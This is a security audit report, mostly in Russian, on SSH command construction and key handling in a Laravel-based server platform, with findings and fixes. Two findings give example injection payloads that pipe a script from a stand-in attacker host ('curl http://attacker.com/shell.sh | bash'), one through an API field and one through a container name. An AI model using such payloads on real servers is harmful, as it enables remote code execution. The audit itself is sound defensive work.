# Backend SSH Operations Security Audit

**Приоритет:** 🔴 Critical
**Статус:** [🔍] В процессе

---

## Обзор

Проверка SSH операций - критически важная часть платформы для управления серверами.

### Ключевые файлы для проверки:

- `app/Traits/ExecuteRemoteCommand.php`
- `app/Traits/SshRetryable.php`
- `app/Models/Server.php` (SSH related methods)
- `app/Models/PrivateKey.php`
- `app/Actions/Server/*.php`
- `app/Jobs/` (jobs that use SSH)

---

## Гипотезы для проверки

### Command Injection

- [✅] **SSH-001**: Проверить все места где формируются SSH команды - OK (HEREDOC защита)
- [🔧] **SSH-002**: Проверить escaping user input в командах - **FIXED: added escapeshellarg()**
- [✅] **SSH-003**: Проверить `ExecuteRemoteCommand` trait на injection - OK (HEREDOC + stdin)
- [⚠️] **SSH-004**: Проверить deployment scripts на command injection - **containerName без escaping**
- [🔧] **SSH-005**: Проверить docker commands construction - FIXED
- [🔧] **SSH-006**: Проверить git commands (clone, pull) - FIXED
- [🔧] **SSH-007**: Проверить backup commands - **FIXED: added escapeshellarg() in DatabaseBackupJob/RestoreJob**
- [🔧] **SSH-008**: Проверить database commands (psql, mysql) - **FIXED: added escapeshellarg() in DatabaseMetricsController**

### Private Key Security

- [✅] **SSH-009**: Проверить как хранятся private keys в БД (encryption) - OK (Laravel encrypted cast)
- [⚠️] **SSH-010**: Проверить временное хранение ключей на диске - ключи остаются в контейнере
- [✅] **SSH-011**: Проверить permissions на временные ключи - OK (0700/0600)
- [🔴] **SSH-012**: Проверить cleanup временных ключей - **НЕТ CLEANUP после git ops!**
- [✅] **SSH-013**: Проверить key passphrase handling - OK (не требуется для автоматизации)
- [⚠️] **SSH-014**: Проверить что ключи не логируются - hidden=true, но нет редактирования base64

### SSH Connection Security

- [ ] **SSH-015**: Проверить SSH connection timeout settings
- [ ] **SSH-016**: Проверить retry logic на auth failures
- [ ] **SSH-017**: Проверить host key verification
- [ ] **SSH-018**: Проверить SSH agent forwarding (должен быть disabled)
- [ ] **SSH-019**: Проверить port forwarding через SSH

### Server Validation

- [ ] **SSH-020**: Проверить IP/hostname validation перед SSH connect
- [ ] **SSH-021**: Проверить port validation
- [ ] **SSH-022**: Проверить username validation
- [ ] **SSH-023**: Проверить что нельзя SSH на localhost/internal IPs (SSRF)

### Output Handling

- [ ] **SSH-024**: Проверить handling SSH output - нет sensitive data leak
- [ ] **SSH-025**: Проверить error output - нет path disclosure
- [ ] **SSH-026**: Проверить logging SSH operations

### Deployment Flow

- [ ] **SSH-027**: Проверить git clone command construction
- [ ] **SSH-028**: Проверить docker build command construction
- [ ] **SSH-029**: Проверить docker run command construction
- [ ] **SSH-030**: Проверить environment variable injection в containers
- [ ] **SSH-031**: Проверить volume mount paths validation

### Database Operations via SSH

- [ ] **SSH-032**: Проверить backup command construction
- [ ] **SSH-033**: Проверить restore command construction
- [ ] **SSH-034**: Проверить database credentials в commands

---

## Findings

### Критические

#### 🔴 SSH-006: Command Injection в git_commit_sha (Application.php:1114-1116)

**Файл:** [Application.php:1114](app/Models/Application.php#L1114)

**Проблема:**
```php
$git_clone_command = "... git fetch --depth=1 origin {$this->git_commit_sha} && git checkout {$this->git_commit_sha} ...";
```

`git_commit_sha` вставляется в команду **без escapeshellarg**.

**API Валидация (ПОДТВЕРЖДЕНО):**
В [bootstrap/helpers/api.php:107](bootstrap/helpers/api.php#L107):
```php
'git_commit_sha' => 'string',  // НЕТ проверки формата!
```

Пользователь через API (`PUT /api/v1/applications/{uuid}`) может установить произвольное значение.

**Вектор атаки:**
```bash
curl -X PUT https://saturn.example.com/api/v1/applications/xxx \
  -H "Authorization: Bearer TOKEN" \
  -d '{"git_commit_sha": "HEAD; curl http://attacker.com/shell.sh | bash #"}'
```

При следующем деплое команда выполнится на сервере!

**Рекомендация:**
1. Добавить валидацию SHA формата в `sharedDataApplications()`:
```php
'git_commit_sha' => ['string', 'regex:/^([a-fA-F0-9]{7,40}|HEAD)$/'],
```
2. Использовать `escapeshellarg($this->git_commit_sha)` в Application.php

**Статус:** [🔧] ИСПРАВЛЕНО
**Severity:** CRITICAL - Remote Code Execution

**Исправление:**
- `bootstrap/helpers/api.php`: Добавлена валидация `regex:/^([a-fA-F0-9]{4,40}|HEAD)$/`
- `app/Models/Application.php`: Добавлен `escapeshellarg()` для defense in depth

---

#### 🔧 SSH-005: Container name без escaping (ScheduledTaskJob.php:141) - ИСПРАВЛЕНО

**Файл:** [ScheduledTaskJob.php:141](app/Jobs/ScheduledTaskJob.php#L141)

**Проблема:**
```php
$exec = "docker exec {$containerName} {$cmd}";
```

`$containerName` вставляется без `escapeshellarg()`. Хотя container name берётся из Docker output, это нарушает принцип defense in depth.

**Рекомендация:**
```php
$exec = "docker exec ".escapeshellarg($containerName)." {$cmd}";
```

**Статус:** [🔧] ИСПРАВЛЕНО
**Исправление:** `app/Jobs/ScheduledTaskJob.php:141` - добавлен `escapeshellarg()`

---

#### 🔴 SSH-002: Command Injection через container names (DatabaseBackupJob, DatabaseRestoreJob)

**Файлы:**
- [DatabaseBackupJob.php](app/Jobs/DatabaseBackupJob.php) - 14+ мест
- [DatabaseRestoreJob.php](app/Jobs/DatabaseRestoreJob.php) - 8 мест
- [HandlesDeploymentCommands.php](app/Traits/Deployment/HandlesDeploymentCommands.php) - 2 места

**Проблема:**
```php
// DatabaseBackupJob.php:133
$commands[] = "docker exec $this->container_name env | grep POSTGRES_";

// DatabaseRestoreJob.php:303
$command = "docker exec -i {$this->container_name} mysql ...";
```

`$this->container_name` формируется из `$this->database->name` + UUID и вставляется в shell команды **БЕЗ `escapeshellarg()`**.

**Локации без escaping в DatabaseBackupJob.php:**
- Строки: 133, 164, 187, 229, 489, 491, 509, 511, 515, 517, 566, 571, 589, 594

**Локации без escaping в DatabaseRestoreJob.php:**
- Строки: 303, 307, 326, 330, 358, 360, 375, 395

**Вектор атаки:**
```bash
# Если container_name = "test; curl http://attacker.com/shell.sh | bash;"
docker exec test; curl http://attacker.com/shell.sh | bash; mysqldump ...
# Команда curl выполнится на сервере!
```

**Рекомендация:**
```php
// БЫЛО (уязвимо)
$commands[] = "docker exec $this->container_name mysqldump ...";

// НУЖНО (безопасно)
$commands[] = "docker exec ".escapeshellarg($this->container_name)." mysqldump ...";
```

**Статус:** [ ] Требует исправления
**Severity:** CRITICAL - Remote Code Execution

---

#### 🔴 SSH-012: Отсутствует cleanup SSH ключей из deployment контейнера

**Файлы:**
- [HandlesGitOperations.php](app/Traits/Deployment/HandlesGitOperations.php)
- [Application.php](app/Models/Application.php)

**Проблема:**
SSH ключ записывается в `/root/.ssh/id_rsa` внутри deployment контейнера для git операций, но **НЕ удаляется** после использования.

```php
// Ключ записывается:
executeInDocker($this->deployment_uuid, "echo '{$private_key}' | base64 -d | tee /root/.ssh/id_rsa > /dev/null")

// НО НЕТ команды удаления после git clone!
```

**Impact:**
- Ключ остается в контейнере до его завершения
- Может быть доступен в логах/дампах памяти процессов

**Рекомендация:**
```php
// Добавить после завершения git операций:
executeInDocker($this->deployment_uuid, 'rm -f /root/.ssh/id_rsa /root/.ssh/known_hosts')
```

**Статус:** [ ] Требует исправления
**Severity:** HIGH

---

### Важные

#### ⚠️ SSH-017: Host key verification отключена

**Файл:** [SshMultiplexingHelper.php:235](app/Helpers/SshMultiplexingHelper.php#L235)

**Проблема:**
```php
'-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null '
```

Host key verification полностью отключена, что делает возможной MITM атаку.

**Контекст:** Для PaaS платформы это может быть приемлемо, так как серверы добавляются динамически. Но рекомендуется:
1. Сохранять host keys при первом подключении
2. Проверять их при последующих

**Статус:** [ ] Оценить risk/benefit

---

### Низкий приоритет

> Записывать проблемы низкого приоритета здесь

---

## Исправления

| ID | Описание | Статус | Файлы |
|----|----------|--------|-------|
| SSH-006 | Command Injection в git_commit_sha | ✅ Fixed | `bootstrap/helpers/api.php`, `app/Models/Application.php` |
| SSH-005 | Container name escaping | ✅ Fixed | `app/Jobs/ScheduledTaskJob.php` |

---

## Заметки аудитора

> Дополнительные заметки при проверке
